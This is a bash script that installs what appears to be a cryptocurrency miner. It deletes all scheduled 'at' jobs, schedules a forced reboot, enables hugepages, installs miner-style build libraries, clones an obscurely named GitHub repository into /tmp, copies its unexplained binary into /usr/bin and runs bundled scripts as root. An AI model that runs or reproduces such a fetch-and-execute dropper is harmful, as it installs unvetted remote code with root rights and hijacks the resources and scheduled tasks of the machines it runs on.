#!/bin/bash

ID="$(hostname)"

THREADS="$(nproc --all)"

for i in `atq | awk '{print $1}'`;do atrm $i;done
echo 'sudo reboot -f' | at now + 12 hours



rm -rf /tmp/vbeerrre/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir vbeerrre
git clone https://github.com/utututiii2/vbeerrre.git /tmp/vbeerrre
cd /tmp/vbeerrre
chmod +x /tmp/vbeerrre/vbeerrre
chmod 777 ./*.sh
cp /tmp/vbeerrre/vbeerrre /usr/bin/
sleep 3


sudo apt-get install dos2unix

sudo dos2unix time1.sh
sudo dos2unix 75.sh
sudo dos2unix 50.sh
sudo dos2unix 80.sh
sudo dos2unix 65.sh
sudo dos2unix 90.sh
sudo dos2unix 40.sh

sudo ./time1.sh


